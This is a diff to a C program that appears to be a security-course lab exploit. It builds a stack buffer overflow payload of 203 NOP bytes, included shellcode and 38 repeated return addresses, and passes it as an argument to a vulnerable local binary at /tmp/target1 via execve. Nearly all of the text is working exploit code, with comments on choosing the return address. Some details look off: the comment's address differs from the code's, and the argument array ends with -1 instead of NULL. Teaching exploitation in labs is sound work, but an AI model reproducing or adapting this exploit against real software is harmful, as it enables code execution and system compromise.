@@ -5,16 +5,37 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/tmp/target2"
+#define TARGET "/tmp/target1"
 
 int main(void)
 {
   char *args[3]; 
   char *env[1];
+
+  char str[408];
+  memset(str, 0, 408);
+
+  // `perl -e 'print "\x90"x203';`
+  for (int i = 0; i < 203; ++i)
+  {
+  	strcat(str, "\x90");
+  }
+
+  // `cat sc`
+  strcat(str, shellcode);
+  // `perl -e 'print"\xf8\xf2\xff\xbf"x38' the return address
   
+  for (int i = 0; i < 38; ++i)
+  {
+    // Anything from 0xbffffb30 to 0xbffffbf0 should work
+    // the return address should point to the \x90
+    // below the shellcode
+    // above the EBP
+    strcat(str, "\x80\xfb\xff\xbf");
+  }
   args[0] = TARGET;
-  args[1] = "student"; 
-  args[2] = NULL;
+  args[1] = str;
+  args[2] = -1;
   
   env[0] = NULL;
   execve(TARGET, args, env);
@@ -22,5 +43,3 @@ int main(void)
 
   return 0;
 }
-
-
